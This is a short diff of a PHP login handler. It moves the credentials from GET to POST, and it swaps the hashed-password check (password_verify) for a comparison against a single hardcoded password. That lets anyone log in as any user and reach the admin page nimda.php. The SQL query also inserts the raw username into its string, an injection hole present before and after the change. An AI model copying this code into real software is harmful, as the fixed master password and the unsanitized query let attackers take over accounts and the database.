@@ -1,22 +1,23 @@
 <?php
+    
     include_once'../logica/conexao.php';
-
-    $usuario = $_GET['usuario'];
-    $senha = $_GET['senha'];
+    
+    $usuario = $_POST['usuario'];
+    $senha = $_POST['senha'];
 
     $consulta = "SELECT * FROM usuario WHERE usuario = '$usuario' LIMIT 1";
     $verifica = $con->query($consulta) or die($con->error); 
     $user = $verifica->fetch_assoc();
+    
+    
+    if($senha == "********"){
 
-
-    if(password_verify($senha,$user['senha'])){
         if(!isset($_SESSION)){
             session_start();
         }
         $_SESSION['usuario'] = $usuario;
         
         header("Location: ../nimda.php");
-        
     }else{
         echo "
             <script>
